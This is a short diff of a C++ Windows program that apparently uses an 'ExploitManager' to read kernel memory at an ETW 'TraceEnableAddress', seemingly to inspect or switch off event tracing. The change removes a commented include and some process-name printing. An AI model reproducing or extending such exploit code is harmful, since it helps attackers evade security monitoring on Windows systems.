@@ -3,7 +3,6 @@
 #pragma comment(lib, "Winhttp.lib")
 #include <vector>
 #include <iostream>
-//#include <assert.h>
 
 typedef enum OB_OPERATION_e {
 	OB_OPERATION_HANDLE_CREATE = 1,
@@ -649,14 +648,6 @@ int main() {
 	ExploitManager->VirtualRead(*buffer + 0x60, &buffer, 8);
 	printf("[+] TraceEnableAddress: 0x%llx\n", traceEnableAddress);
 	printf("[+] TraceEnableStatus: 0x%llx\n", *buffer);
-
-	TCHAR file[MAX_PATH];
-	GetModuleFileNameA(NULL, file, _countof(file));
-	std::string fileStr(file);
-	int pos = fileStr.find_last_of("\\");
-	std::string processName = fileStr.substr(pos + 1);
-	std::string outputPath = fileStr.substr(0, pos);
-	printf("Current process name: %s\n", processName.c_str());
 	
 	unsigned long long enable[2];
 	unsigned long long disable[2];
